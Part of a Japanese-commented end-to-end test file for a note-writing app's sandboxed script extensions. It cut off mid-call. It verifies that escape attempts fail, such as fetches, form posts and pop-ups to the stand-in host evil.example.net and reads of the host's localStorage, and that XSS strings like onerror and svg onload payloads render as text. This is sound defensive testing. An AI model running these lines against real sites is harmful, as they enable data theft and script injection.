// スクリプト拡張(隔離実行)の E2E: 実際の Chromium のサンドボックスで、悪意のあるスクリプトを動かして攻撃を止められることを確かめる。
// `bun run test:e2e:scripts` から実行する(Firebase / エミュレータ不要)。vite dev を空きポートで起動する。
// 攻撃用のスクリプトは tests/e2e/fixtures/scripts/ にある(extensions/ には置かない)。
// レジストリ(https://storift.shiki-01.com/extensions-registry/)・通信先(ok.example.com / evil.example.net)は
// ルートのモックで、本番・外部へは一切アクセスしない。E2E_SHOT_DIR を指定すると、実画面を保存する。
import { spawnSync } from 'node:child_process';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import {
	ROOT,
	check,
	chromium,
	finish,
	seedProject,
	shot,
	sleep,
	startVite,
	waitFor
} from './helpers.mjs';

const FIXTURES = path.join(ROOT, 'tests/e2e/fixtures/scripts');
const REGISTRY_ORIGIN = 'https://storift.shiki-01.com';
const REGISTRY_PREFIX = '/extensions-registry/';
const CARD = (id) => `[data-testid="ext-card-${id}"]`;

// 構文エラーのスクリプト(prettier / eslint が読めないので、ファイルにせずここで持つ)
const INLINE_FIXTURES = { 'syntax-error.js': '// 構文エラー\nconst = ;\n' };
const fixture = (name) =>
	INLINE_FIXTURES[name] ?? fs.readFileSync(path.join(FIXTURES, name), 'utf8');

/** テスト用のマニフェスト。権限は呼び出し側が決める */
function manifestOf(id, permissions, extra = {}) {
	const network = permissions.network ?? [];
	return {
		id,
		name: `テスト ${id}`,
		description: '攻撃テスト用のスクリプト。',
		version: '1.0.0',
		author: 'e2e',
		kind: 'script',
		apiVersion: 1,
		platforms: ['web', 'desktop'],
		icon: 'puzzle',
		license: 'MIT',
		updatedAt: '2026-11-12',
		entry: 'main.js',
		permissions,
		privacy: {
			sends: network.map((host) => ({ to: host, items: ['テスト用の通信'], when: 'テスト中' })),
			stores: [],
			onDisable: '無効にすると止まります'
		},
		...extra
	};
}

function bundleText(manifest, source) {
	return `${JSON.stringify({
		format: 'storift-extension-bundle',
		bundleVersion: 1,
		manifest,
		files: { [manifest.entry]: source }
	})}\n`;
}

/** 設定の「ファイルから追加」で入れて、同意(未審査のチェック込み)して有効にする */
async function installFile(page, manifest, source, { enable = true } = {}) {
	await page.getByTestId('pack-file-input').setInputFiles({
		name: `${manifest.id}.storiftext.json`,
		mimeType: 'application/json',
		buffer: Buffer.from(bundleText(manifest, source))
	});
	await page.getByTestId('consent-confirm').waitFor({ timeout: 15_000 });
	if (!enable) return;
	await page.getByTestId('consent-ack').locator('input').check();
	await page.getByTestId('consent-confirm').click();
	await page.locator(CARD(manifest.id)).waitFor({ timeout: 10_000 });
}

/** 静的な検査を通らない(そのままの)スクリプトを、隔離環境へ直接読み込む。CSP が拒否することを確かめるため */
async function launchRaw(page, manifest, source) {
	await page.evaluate(
		async ({ manifest, source }) => {
			const { scriptRuntime } = await import('/src/lib/extensions/script/scriptRuntime.svelte.ts');
			window.__notices = [];
			const ctx = {
				platform: 'web',
				events: { on: () => () => {} },
				session: { current: () => null, endNow: () => false },
				app: { page: () => null, visible: () => true },
				getProjectTitle: async () => undefined,
				getProjectCharCount: async () => undefined,
				notify: {
					success: (m) => window.__notices.push(m),
					error: (m) => window.__notices.push(m),
					info: (m) => window.__notices.push(m)
				}
			};
			scriptRuntime.launch(manifest, source, ctx);
		},
		{ manifest, source }
	);
}

async function runtimeState(page, id) {
	return page.evaluate(async (id) => {
		const { scriptRuntime } = await import('/src/lib/extensions/script/scriptRuntime.svelte.ts');
		const s = scriptRuntime.state(id);
		return s ? JSON.parse(JSON.stringify(s)) : null;
	}, id);
}

/** その拡張の隔離環境(iframe)の数。iframe の title に拡張名が入っている */
const sandboxFramesOf = (page, id) =>
	page.evaluate(
		(name) =>
			[...document.querySelectorAll('iframe[data-storift-sandbox]')].filter((f) =>
				f.title.includes(name)
			).length,
		`テスト ${id}`
	);

const sandboxFrames = (page) =>
	page.frames().filter((f) => f !== page.mainFrame() && f.url() === 'about:srcdoc');

/** 設定欄の list の項目(`名前=pass|FAIL:詳細`)を集める */
async function readResults(page, id, expect) {
	const card = page.locator(CARD(id));
	try {
		await waitFor(
			`${id} の結果`,
			async () => (await card.locator('.list li').count()) >= expect,
			30_000,
			250
		);
	} catch (error) {
		console.log(
			`  (${id} のカード: ${(await card.innerText()).replace(/\s+/g, ' ').slice(0, 600)})`
		);
		throw error;
	}
	const items = await card.locator('.list li').allInnerTexts();
	return items.map((t) => t.replace(/\s+/g, ' ').trim());
}

function reportResults(items, { skip = [] } = {}) {
	for (const item of items) {
		const [name, rest] = [item.split('=')[0], item.slice(item.indexOf('=') + 1)];
		if (skip.includes(name)) continue;
		check(name, rest.startsWith('pass'), rest.startsWith('pass') ? '' : rest);
	}
}

function buildRegistry() {
	const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'storift-registry-'));
	const r = spawnSync('bun', ['scripts/build-registry.ts', dir], { cwd: ROOT, encoding: 'utf8' });
	if (r.status !== 0) throw new Error(`レジストリを生成できません:\n${r.stdout}\n${r.stderr}`);
	return dir;
}

/**
 * シェル自身が応答しなくなったとき、ホストが iframe ごと取り除くこと。
 * 既定の(ヘッドレスの)Chromium は、sandbox 付きの iframe をホストと同じプロセスで動かすため、シェルの主スレッドが
 * 固まるとホストごと固まる(検証済み)。サイト分離と sandbox 付き iframe の分離(IsolateSandboxedIframes)を有効にした
 * Chromium で、別に確かめる。
 */
async function shellHangScenario(base) {
	console.log('[シェル自身が応答しなくなったとき(サイト分離を有効にした Chromium で確認)]');
	const browser = await chromium.launch({
		args: ['--site-per-process', '--enable-features=IsolateSandboxedIframes']
	});
	try {
		const context = await browser.newContext({ serviceWorkers: 'block', locale: 'ja-JP' });
		const page = await context.newPage();
		await page.goto(`${base}/settings#extensions`);
		await page.locator(CARD('monolog')).waitFor({ timeout: 30_000 });
		await installFile(
			page,
			manifestOf('attack-shell-hang', { ui: true }),
			'storift.ui.set("settings", [{ type: "text", text: "起動" }]);'
		);
		await page.locator(CARD('attack-shell-hang')).getByText('起動').waitFor({ timeout: 20_000 });
		await sleep(500);
		const hangFrame = page.frames().find((f) => f !== page.mainFrame());
		// シェルの主スレッドを固める(拡張のコードではなく、シェル自身が固まった想定)
		await hangFrame.evaluate('setTimeout(() => { for (;;) {} }, 0)');
		const stall = await Promise.race([
			page.evaluate(
				() =>
					new Promise((resolve) => {
						let last = performance.now();
						let max = 0;
						let ticks = 0;
						const timer = setInterval(() => {
							const now = performance.now();
							max = Math.max(max, now - last);
							last = now;
							if (++ticks >= 100) {
								clearInterval(timer);
								resolve(max);
							}
						}, 50);
					})
			),
			sleep(40_000).then(() => Infinity)
		]);
		check('シェルが固まっても、アプリの UI は固まらない', stall < 1000, `${Math.round(stall)}ms`);
		await page.getByTestId('ext-stopped-attack-shell-hang').waitFor({ timeout: 30_000 });
		const text = await page.getByTestId('ext-stopped-attack-shell-hang').innerText();
		check(
			'隔離された環境が応答しないとして停止する',
			text.includes('隔離された環境が応答しなくなった'),
			text
		);
		check('iframe が取り除かれた', (await sandboxFramesOf(page, 'attack-shell-hang')) === 0);
	} finally {
		await browser.close();
	}
}

async function main() {
	const registryDir = buildRegistry();
	const vite = await startVite();
	const browser = await chromium.launch();
	const requests = { evil: [], ok: [], registry: [] };
	const registryMock = { revoked: [] };
	try {
		const context = await browser.newContext({
			viewport: { width: 1280, height: 900 },
			serviceWorkers: 'block',
			locale: 'ja-JP'
		});
		// 通信先のモック。evil に届いたらその時点で失敗(CSP で止められているはず)
		await context.route('**://evil.example.net/**', (route) => {
			requests.evil.push(route.request().url());
			return route.fulfill({
				status: 200,
				headers: { 'access-control-allow-origin': '*' },
				body: 'stolen'
			});
		});
		await context.route('**://ok.example.com/**', (route) => {
			requests.ok.push(route.request().url());
			return route.fulfill({
				status: 200,
				contentType: 'text/plain',
				headers: { 'access-control-allow-origin': '*' },
				body: 'hello'
			});
		});
		await context.route(`${REGISTRY_ORIGIN}${REGISTRY_PREFIX}**`, (route) => {
			const url = new URL(route.request().url());
			requests.registry.push(url.pathname);
			const file = path.join(registryDir, url.pathname.slice(REGISTRY_PREFIX.length));
			if (!fs.existsSync(file)) return route.fulfill({ status: 404, body: 'not found' });
			let body = fs.readFileSync(file, 'utf8');
			if (file.endsWith('index.json') && registryMock.revoked.length > 0) {
				body = JSON.stringify({ ...JSON.parse(body), revoked: registryMock.revoked });
			}
			return route.fulfill({
				status: 200,
				contentType: 'application/json',
				headers: { 'access-control-allow-origin': '*' },
				body
			});
		});

		const page = await context.newPage();
		const pageErrors = [];
		const popups = [];
		const mainNavigations = [];
		// Playwright(serviceWorkers: 'block')が、サンドボックスのワーカーの中へ差し込む初期化スクリプトが
		// navigator.serviceWorker を読んで出す SecurityError は、拡張のコードやアプリの例外ではないので除く
		const HARNESS_ERROR = /Service worker is disabled because the context is sandboxed/;
		// シェルの主スレッドへ直接攻撃する場面では、攻撃自体(indexedDB.databases() の拒否など)が
		// 出す未処理の拒否を数えない(アプリ側のエラーではない)
		let countErrors = true;
		page.on('pageerror', (e) => {
			if (HARNESS_ERROR.test(e.message) || !countErrors) return;
			pageErrors.push(e.message);
			console.log(`  pageerror: ${e.message}`);
		});
		// ポップアップ = ほかのページから開かれたページ(テスト自身が newPage で開くものは数えない)
		context.on('page', async (p) => {
			if (p !== page && (await p.opener().catch(() => null))) popups.push(p.url());
		});
		page.on('framenavigated', (f) => {
			if (f === page.mainFrame()) mainNavigations.push(f.url());
		});
		const base = vite.base;
		await page.goto(`${base}/home`);
		const pid = await seedProject(page, { title: 'E2E スクリプト' });
		await page.goto(`${base}/settings#extensions`);
		await page.locator(CARD('monolog')).waitFor({ timeout: 30_000 });
		const settingsUrl = page.url();
		mainNavigations.length = 0;

		// ホストの秘密(攻撃の標的)。localStorage と、メインの DB(StoriftDB)に印を入れておく
		await page.evaluate(() => localStorage.setItem('storift:secret-canary', 'host-secret'));

		console.log('[攻撃 1・2・3・4・9: 隔離の外へ出ようとするスクリプト(ワーカー内)]');
		await installFile(
			page,
			manifestOf('attack-escape', { ui: true, network: ['ok.example.com'] }),
			fixture('escape.js')
		);
		const escape = await readResults(page, 'attack-escape', 30);
		reportResults(escape);
		check('攻撃の結果が 30 件以上そろった', escape.length >= 30, String(escape.length));
		check('宣言したホスト(ok.example.com)へは通信できた', requests.ok.length > 0);
		check(
			'宣言していないホスト(evil.example.net)へは 1 件も届いていない',
			requests.evil.length === 0,
			requests.evil.join(',')
		);
		check(
			'ホストの localStorage は変わっていない',
			(await page.evaluate(() => localStorage.getItem('storift:secret-canary'))) === 'host-secret'
		);
		check('ポップアップは開かなかった', popups.length === 0, popups.join(','));
		check(
			'ホストのページは移動していない',
			page.url() === settingsUrl && mainNavigations.length === 0
		);

		console.log('[隔離の構成(iframe とシェル)]');
		const frames = sandboxFrames(page);
		check('隔離された iframe が 1 つある', frames.length === 1, String(frames.length));
		const sandboxAttr = await page.evaluate(() =>
			[...document.querySelectorAll('iframe[data-storift-sandbox]')].map((f) => ({
				sandbox: f.getAttribute('sandbox'),
				src: f.getAttribute('src'),
				allow: f.getAttribute('allow'),
				csp: /content="([^"]*)"/.exec(f.srcdoc)?.[1] ?? ''
			}))
		);
		check(
			'sandbox は allow-scripts のみ',
			sandboxAttr.length === 1 && sandboxAttr[0].sandbox === 'allow-scripts',
			sandboxAttr[0]?.sandbox
		);
		const csp = sandboxAttr[0]?.csp ?? '';
		check("CSP に 'unsafe-eval' と 'unsafe-inline' が無い", !/unsafe-(eval|inline)/.test(csp));
		check(
			'CSP の connect-src は宣言したホストの https のみ',
			/connect-src https:\/\/ok\.example\.com(;|$)/.test(csp),
			csp
		);
		check(
			'CSP の meta は iframe のドキュメントの先頭にある',
			/^<!doctype html><html><head><meta http-equiv="Content-Security-Policy"/.test(
				await page.evaluate(() => document.querySelector('iframe[data-storift-sandbox]').srcdoc)
			)
		);

		check(
			'ここまでにアプリ側のページエラー(未処理の例外)が出ていない',
			pageErrors.length === 0,
			pageErrors.join(' | ')
		);

		console.log(
			'[シェル(iframe の主スレッド)から攻撃: parent / top / localStorage / open / navigation]'
		);
		if (frames[0]) {
			countErrors = false;
			const shellAttacks = await frames[0].evaluate(async () => {
				const out = {};
				const attempt = async (name, fn) => {
					try {
						out[name] = { ok: true, value: String(await fn()).slice(0, 40) };
					} catch (error) {
						out[name] = { ok: false, error: error && error.name };
					}
				};
				await attempt('parent.document', () => parent.document.title);
				await attempt('parent.localStorage', () => parent.localStorage.getItem('x'));
				await attempt('top.location.href-read', () => top.location.href);
				await attempt('top.location-write', () => {
					top.location.href = 'https://evil.example.net/top';
				});
				await attempt('own-localStorage', () => localStorage.getItem('storift:secret-canary'));
				await attempt('own-indexedDB', () => indexedDB.databases());
				await attempt('own-cookie', () => document.cookie);
				await attempt('window.open', () => {
					const w = window.open('https://evil.example.net/popup');
					if (!w) throw new Error('null');
					return 'opened';
				});
				await attempt('form-submit', () => {
					const form = document.createElement('form');
					form.action = 'https://evil.example.net/form';
					form.method = 'post';
					document.body.appendChild(form);
					form.submit();
					return 'submitted';
				});
				await attempt('script-src-external', () => {
					return new Promise((resolve, reject) => {
						const s = document.createElement('script');
						s.src = 'https://ok.example.com/inject.js';
						s.onload = () => resolve('loaded');
						s.onerror = () => reject(new Error('blocked'));
						document.head.appendChild(s);
					});
				});
				await attempt('inline-script', () => {
					const s = document.createElement('script');
					s.textContent = 'window.__inline = 1';
					document.head.appendChild(s);
					if (window.__inline === 1) return 'ran';
					throw new Error('blocked');
				});
				await attempt('img-load', () => {
					return new Promise((resolve, reject) => {
						const img = new Image();
						img.onload = () => resolve('loaded');
						img.onerror = () => reject(new Error('blocked'));
						img.src = 'https://evil.example.net/pixel.png';
					});
				});
				await attempt('fetch-evil', () => fetch('https://evil.example.net/shell'));
				await attempt('eval', () => eval('1+1'));
				return out;
			});
			const blocked = (name) => shellAttacks[name]?.ok === false;
			for (const name of [
				'parent.document',
				'parent.localStorage',
				'top.location.href-read',
				'top.location-write',
				'own-localStorage',
				'own-indexedDB',
				'own-cookie',
				'window.open',
				'form-submit',
				'script-src-external',
				'inline-script',
				'img-load',
				'fetch-evil',
				'eval'
			]) {
				// form-submit は例外にならず黙って無視されることがある。実際に通信が起きていないかを別に確かめる
				if (name === 'form-submit') continue;
				check(`シェルから ${name} は失敗`, blocked(name), JSON.stringify(shellAttacks[name]));
			}
			await sleep(500);
			check(
				'シェルのフォーム送信・画像・fetch が evil に届いていない',
				requests.evil.length === 0,
				requests.evil.join(',')
			);
			check('シェルから開いたポップアップが無い', popups.length === 0);
			check('ホストのページは移動していない(top への書き換え後)', page.url() === settingsUrl);
		}

		console.log(
			'[攻撃 4: 静的な検査に引っかかる書き方(eval / new Function / importScripts / import() / WebAssembly)]'
		);
		// インストールの経路では拒否される
		await page.getByTestId('pack-file-input').setInputFiles({
			name: 'raw.storiftext.json',
			mimeType: 'application/json',
			buffer: Buffer.from(
				bundleText(
					manifestOf('attack-raw', { ui: true, network: ['ok.example.com'] }),
					fixture('raw.js')
				)
			)
		});
		await sleep(800);
		check(
			'そのままの書き方は、インストールで拒否される',
			(await page.locator(CARD('attack-raw')).count()) === 0 &&
				(await page.getByTestId('consent-confirm').count()) === 0
		);
		// 隔離環境へ直接読み込む(CSP の確認)
		await launchRaw(
			page,
			manifestOf('attack-raw', { ui: true, network: ['ok.example.com'] }),
			fixture('raw.js')
		);
		let rawState = null;
		await waitFor(
			'raw の結果',
			async () => {
				rawState = await runtimeState(page, 'attack-raw');
				return rawState?.settings?.nodes?.[0]?.items?.length >= 7;
			},
			20_000,
			250
		);
		reportResults(rawState.settings.nodes[0].items.map((i) => i.text));
		check(
			'ワーカーの CSP が eval などを拒否した後も、評価の通信が evil に届いていない',
			requests.evil.length === 0
		);

		console.log('[攻撃 7: 宣言していないイベント・権限の無い storage / notify]');
		await installFile(page, manifestOf('attack-noperms', { ui: true }), fixture('noperms.js'));
		reportResults(await readResults(page, 'attack-noperms', 6));

		console.log('[攻撃 6・8: ストレージ上限・UI の上限・UI への HTML の混入]');
		const pageErrorsBefore = pageErrors.length;
		await installFile(
			page,
			manifestOf('attack-abuse', { ui: true, storage: true }),
			fixture('abuse.js')
		);
		const abuse = await readResults(page, 'attack-abuse', 9);
		reportResults(abuse);
		const abuseCard = page.locator(CARD('attack-abuse'));
		const dom = await abuseCard.evaluate((card) => {
			const ui = card.querySelector('[data-testid="script-ui"]');
			return {
				scripts: [...ui.querySelectorAll('script, img, svg, iframe, object, embed, style')].filter(
					(el) => !el.closest('button.link')
				).length,
				anchors: ui.querySelectorAll('a').length,
				jsHrefs: card.querySelectorAll('[href^="javascript:" i], [src^="javascript:" i]').length,
				handlers: [...ui.querySelectorAll('*')].filter((el) =>
					[...el.attributes].some((a) => a.name.startsWith('on'))
				).length,
				heading: ui.querySelector('h5')?.textContent,
				text: ui.querySelector('.text')?.textContent,
				button: ui.querySelector('button')?.textContent?.trim(),
				inputValue: ui.querySelector('input')?.value,
				title: document.title,
				pwned: document.body.dataset.pwned ?? null,
				links: ui.querySelectorAll('button.link').length
			};
		});
		check(
			'UI の記述の中の HTML 要素は 1 つも作られない',
			dom.scripts === 0 && dom.handlers === 0,
			JSON.stringify(dom)
		);
		check('<a> も javascript: の URL も無い', dom.anchors === 0 && dom.jsHrefs === 0);
		check(
			'見出しは文字としてそのまま出る',
			dom.heading === '<img src=x onerror="document.title=1">',
			dom.heading
		);
		check(
			'本文の <script> は文字としてそのまま出る',
			dom.text === '<script>document.body.dataset.pwned="1"</script><b>太字</b>',
			dom.text
		);
		check('ボタンのラベルも文字', dom.button === '<u>下線</u>', dom.button);
		check('入力欄の値も文字', dom.inputValue === '"><svg onload=alert(1)>', dom.inputValue);
		check(
			'ホストの document.title と body は変わらない',
			dom.pwned === null && !/^1$/.test(dom.title)
		);
		check('https のリンクは、ボタンとして描画される', dom.links === 1);
		// リンクは、押すと確認してから開く(確認なしでは開かない)
		const [popupOnLink] = await Promise.all([
			page.waitForEvent('popup', { timeout: 1500 }).catch(() => null),
			abuseCard.getByTestId('script-link').click()
		]);
		check('リンクを押しただけでは外部サイトは開かない(確認が出る)', popupOnLink === null);
		await page.getByText('外部サイトを開きます').first().waitFor({ timeout: 5000 });
		await shot(page, 'phase3-link-confirm');
		await page.getByRole('button', { name: 'キャンセル' }).last().click();
		check(
			'この間にアプリ側のページエラーが出ていない',
			pageErrors.length === pageErrorsBefore,
			pageErrors.slice(pageErrorsBefore).join(' | ')
		);
		const uiState = await runtimeState(page, 'attack-abuse');
		check(
			'拡張は(権限違反が少ないので)動作中のまま',
			uiState?.status === 'running',
			uiState?.status
		);

		console.log('[攻撃 6: 通知の連打]');
		await installFile(
			page,
			manifestOf('attack-notify', { ui: true, notify: true }),
			fixture('notify.js')
		);
		reportResults(await readResults(page, 'attack-notify', 2));

		console.log('[宣言したイベントだけが、絞り込まれて届く]');
		await installFile(
			page,
			manifestOf('attack-events', { ui: true, events: ['app:visibility'] }),
			fixture('events.js')
		);
		await page
			.locator(CARD('attack-events'))
			.getByText('購読しました')
			.waitFor({ timeout: 20_000 });
		await page.evaluate(() => {
			Object.defineProperty(document, 'visibilityState', {
				configurable: true,
				get: () => 'hidden'
			});
			document.dispatchEvent(new Event('visibilitychange'));
		});
		const eventItems = await readResults(page, 'attack-events', 1);
		check(
			'app:visibility は { "visible": false } だけが届く',
			eventItems.at(-1) === '{"visible":false}',
			eventItems.join(',')
		);

		console.log(
			'[攻撃 6: フラッディング・巨大ペイロード・不正な形・権限違反の繰り返し・構文エラー]'
		);
		const stopCases = [
			['attack-flood', 'flood.js', {}, 'メッセージまたは画面の更新が多すぎた'],
			['attack-huge', 'huge.js', {}, '大きすぎるメッセージ'],
			['attack-badshape', 'badshape.js', {}, '決められた形ではないメッセージ'],
			[
				'attack-violations',
				'violations.js',
				{ storage: false },
				'権限のない操作や上限を超える操作を繰り返した'
			],
			['attack-syntax', 'syntax-error.js', {}, '読み込み中にエラー']
		];
		for (const [id, file, perms, message] of stopCases) {
			const t0 = Date.now();
			await installFile(page, manifestOf(id, { ui: true, ...perms }), fixture(file));
			await page.getByTestId(`ext-stopped-${id}`).waitFor({ timeout: 30_000 });
			const text = await page.getByTestId(`ext-stopped-${id}`).innerText();
			check(`${file}: 停止して理由が表示される`, text.includes(message), text.replace(/\s+/g, ' '));
			check(`${file}: 隔離環境(iframe)が取り除かれた`, (await sandboxFramesOf(page, id)) === 0);
			console.log(`    (${Date.now() - t0}ms)`);
		}
		check('停止の通知(トースト)が出た', (await page.getByText('を停止しました').count()) > 0);

		console.log(
			'[攻撃 5: 無限ループ(UI が固まらず、ウォッチドッグが止め、繰り返すと自動で無効になる)]'
		);
		await installFile(page, manifestOf('attack-loop', { ui: true }), fixture('loop.js'));
		// ループの最中にも、アプリの UI が反応し続ける(メインスレッドの最大の遅れを測る)
		const stall = await page.evaluate(
			() =>
				new Promise((resolve) => {
					let last = performance.now();
					let max = 0;
					let ticks = 0;
					const timer = setInterval(() => {
						const now = performance.now();
						max = Math.max(max, now - last);
						last = now;
						if (++ticks >= 70) {
							clearInterval(timer);
							resolve(max);
						}
					}, 50);
				})
		);
		check(
			'無限ループの間も、アプリの UI は固まらない(最大の遅れ 500ms 未満)',
			stall < 500,
			`${Math.round(stall)}ms`
		);
		await page.getByTestId('ext-stopped-attack-loop').waitFor({ timeout: 20_000 });
		const loopText = await page.getByTestId('ext-stopped-attack-loop').innerText();
		check(
			'ウォッチドッグが止めて、理由が表示される',
			loopText.includes('応答がなくなった'),
			loopText
		);
		check(
			'利用者に通知される(トースト)',
			(await page.getByText('「テスト attack-loop」を停止しました').count()) > 0
		);
		check('隔離環境が取り除かれた', (await sandboxFramesOf(page, 'attack-loop')) === 0);
		await shot(page, 'phase3-stopped');
		for (let n = 2; n <= 3; n++) {
			await page.getByTestId('ext-restart-attack-loop').click();
			await page
				.getByTestId('ext-stopped-attack-loop')
				.waitFor({ state: 'hidden', timeout: 5000 })
				.catch(() => {});
			if (n < 3) await page.getByTestId('ext-stopped-attack-loop').waitFor({ timeout: 20_000 });
		}
		await page.getByTestId('ext-autodisabled-attack-loop').waitFor({ timeout: 20_000 });
		check('3 回続けて止まると自動で無効になる', true);
		check(
			'スイッチがオフになる',
			(await page
				.locator(`${CARD('attack-loop')} [role="switch"]`)
				.getAttribute('aria-checked')) === 'false'
		);
		check(
			'iframe がすべて取り除かれた',
			sandboxFrames(page).length === 0 || (await sandboxFramesOf(page, 'attack-loop')) === 0
		);
		await shot(page, 'phase3-autodisabled');
		check(
			'無効になったあとは、再び有効にするまで動かない',
			(await runtimeState(page, 'attack-loop')) === null
		);

		console.log('[同意画面: 個人追加のスクリプトは「未審査のコードを実行する」が必須]');
		await page.getByTestId('pack-file-input').setInputFiles({
			name: 'consent.storiftext.json',
			mimeType: 'application/json',
			buffer: Buffer.from(
				bundleText(
					manifestOf('consent-check', {
						ui: true,
						storage: true,
						notify: true,
						events: ['session:end'],
						read: ['project:title'],
						network: ['ok.example.com']
					}),
					'1'
				)
			)
		});
		await page.getByTestId('consent-confirm').waitFor({ timeout: 10_000 });
		const consentText = await page.locator('[role="dialog"]').last().innerText();
		check(
			'同意画面に、平易な日本語の権限が並ぶ',
			[
				'執筆の終了を受け取ります',
				'作品名を受け取ります',
				'次のサーバーと通信します: ok.example.com',
				'通知',
				'操作画面'
			].every((t) => consentText.includes(t)),
			consentText.slice(0, 300)
		);
		check(
			'隔離と取り消せないことの注意が出る',
			consentText.includes('隔離された環境') && consentText.includes('取り消せません')
		);
		check('運営者は保証しないと出る', consentText.includes('保証しません'));
		check(
			'個人追加(未審査)のラベルと赤い警告が出る',
			consentText.includes('個人追加(未審査)') &&
				(await page.locator('[role="dialog"]').last().getByTestId('unreviewed-warning').count()) ===
					1
		);
		check(
			'チェックするまで「同意して有効にする」は押せない',
			await page.getByTestId('consent-confirm').isDisabled()
		);
		await shot(page, 'phase3-consent-personal-desktop-light');
		await page.getByTestId('consent-ack').locator('input').check();
		check('チェックすると押せる', !(await page.getByTestId('consent-confirm').isDisabled()));
		await page.getByRole('button', { name: 'キャンセル' }).last().click();
		await sleep(400);
		check(
			'キャンセルすると有効にならない(スクリプトは動かない)',
			(await sandboxFramesOf(page, 'consent-check')) === 0
		);

		console.log('[コミュニティ(レビュー済み)のスクリプトをレジストリから入れる: ポモドーロ]');
		await page.getByTestId('open-pack-browser').click();
		await page.getByTestId('pack-row-pomodoro-timer').waitFor({ timeout: 15_000 });
		await page.getByTestId('pack-row-discord-webhook').waitFor({ timeout: 5000 });
		await page.getByTestId('pack-row-pomodoro-timer').click();
		await page.getByTestId('pack-detail').waitFor({ timeout: 5000 });
		const detail = await page.getByTestId('pack-detail').innerText();
		check(
			'詳細に、スクリプトの注意と権限が出る',
			detail.includes('隔離された環境') && detail.includes('通信しません')
		);
		await shot(page, 'phase3-browser-detail');
		await page.getByTestId('pack-install').click();
		await page.getByTestId('consent-confirm').waitFor({ timeout: 15_000 });
		const communityConsent = await page.locator('[role="dialog"]').last().innerText();
		check(
			'コミュニティ(レビュー済み)のラベルが出て、未審査のチェックは無い',
			communityConsent.includes('コミュニティ(レビュー済み)') &&
				(await page.getByTestId('consent-ack').count()) === 0 &&
				(await page.locator('[role="dialog"]').last().getByTestId('unreviewed-warning').count()) ===
					0
		);
		check(
			'同意前でも押せる(公式のレビュー済み)',
			!(await page.getByTestId('consent-confirm').isDisabled())
		);
		await shot(page, 'phase3-consent-community-desktop-light');
		check('同意するまで、スクリプトは動かない', (await sandboxFramesOf(page, 'ポモドーロ')) === 0);
		await page.getByTestId('consent-confirm').click();
		await page.locator(CARD('pomodoro-timer')).waitFor({ timeout: 10_000 });
		await page.locator(`${CARD('pomodoro-timer')} .ui`).waitFor({ timeout: 20_000 });
		check(
			'ポモドーロが動き、設定欄が出る',
			(await page.locator(CARD('pomodoro-timer')).innerText()).includes('作業の時間')
		);
		await page.locator(CARD('pomodoro-timer')).scrollIntoViewIfNeeded();
		await shot(page, 'phase3-card-pomodoro-desktop-light');

		console.log('[ツールバーのポップアップ(宣言的な UI)]');
		await page.goto(`${base}/project/${pid}/editor`);
		await page.locator('[role="textbox"][aria-label="エディタ"]').waitFor({ timeout: 30_000 });
		await page.locator('[data-testid="toolbar-ext-pomodoro-timer"]').waitFor({ timeout: 20_000 });
		await page.locator('[data-testid="toolbar-ext-pomodoro-timer"]').click();
		const panel = page.getByTestId('script-panel-pomodoro-timer');
		await panel.waitFor({ timeout: 10_000 });
		await panel.getByTestId('script-btn-start').waitFor({ timeout: 10_000 });
		check('ポップアップに 25:00 と開始ボタンが出る', (await panel.innerText()).includes('25:00'));
		await panel.getByTestId('script-btn-start').click();
		await panel.getByTestId('script-btn-stop').waitFor({ timeout: 5000 });
		await sleep(2200);
		check(
			'開始すると秒が進む',
			!(await panel.innerText()).includes('25:00'),
			(await panel.innerText()).replace(/\s+/g, ' ')
		);
		check(
			'動作中は、ツールバーのアイコンにインジケータが出る',
			(await page.locator('[data-testid="toolbar-ext-pomodoro-timer"] .tool-dot').count()) === 1
		);
		await shot(page, 'phase3-popup-pomodoro-desktop-light');
		await panel.getByTestId('script-btn-stop').click();
		await panel.getByTestId('script-btn-start').waitFor({ timeout: 5000 });
		await page.keyboard.press('Escape');

		console.log('[失効(キルスイッチ): 設定を開くと確認し、該当する拡張を無効にして理由を出す]');
		check(
			'失効が無いときは、有効のまま',
			await page.evaluate(() =>
				JSON.parse(localStorage.getItem('storift:extensions:enabled') || '[]').includes(
					'pomodoro-timer'
				)
			)
		);
		registryMock.revoked = [
			{
				id: 'pomodoro-timer',
				versions: ['1.0.0'],
				reason: 'E2E: 不正な通信が見つかったため',
				at: '2026-11-12'
			}
		];
		await page.goto(`${base}/settings#extensions`);
		await page.getByTestId('ext-revoked-pomodoro-timer').waitFor({ timeout: 20_000 });
		const revokedText = await page.getByTestId('ext-revoked-pomodoro-timer').innerText();
		check(
			'無効になり、理由が表示される',
			revokedText.includes('不正な通信が見つかったため'),
			revokedText
		);
		check(
			'スイッチはオフで、押せない',
			(await page
				.locator(`${CARD('pomodoro-timer')} [role="switch"]`)
				.getAttribute('aria-checked')) === 'false' &&
				(await page.locator(`${CARD('pomodoro-timer')} [role="switch"]`).isDisabled())
		);
		check('iframe が取り除かれた', (await sandboxFramesOf(page, 'ポモドーロ')) === 0);
		check(
			'失効の通知(トースト)が出る',
			(await page.getByText('運営により失効されたため、無効にしました').count()) > 0
		);
		await shot(page, 'phase3-revoked-desktop-light');
		check(
			'再起動しても(オフラインでも)失効した版は動かない',
			await page.evaluate(
				() =>
					!JSON.parse(localStorage.getItem('storift:extensions:enabled') || '[]').includes(
						'pomodoro-timer'
					)
			)
		);

		console.log('[起動時の失効リストの確認: スクリプトを有効にしているときだけ、1 日 1 回まで]');
		registryMock.revoked = [];
		const indexCount = () => requests.registry.filter((p) => p.endsWith('index.json')).length;
		const bootCheck = async (label, prepare, expectRequest) => {
			const p = await context.newPage();
			await p.goto(`${base}/home`);
			await p.evaluate(prepare);
			const before = indexCount();
			await p.goto(`${base}/home`);
			await sleep(3500);
			check(
				label,
				indexCount() > before === expectRequest,
				`index.json の取得: ${indexCount() - before}`
			);
			await p.close();
		};
		await bootCheck(
			'スクリプトを有効にしていなければ、起動しても通信しない',
			() => {
				localStorage.setItem('storift:extensions:enabled', '[]');
				localStorage.removeItem('storift:extensions:revocation:last');
			},
			false
		);
		await page.goto(`${base}/home`);
		await page.goto(`${base}/settings#extensions`);
		await page.locator(CARD('pomodoro-timer')).waitFor();
		// 設定を開いたとき、失効リストを確認する。失効が解除されている(一覧に無い)ので、有効にできる
		await page.waitForFunction(
			(sel) => !document.querySelector(sel)?.hasAttribute('disabled'),
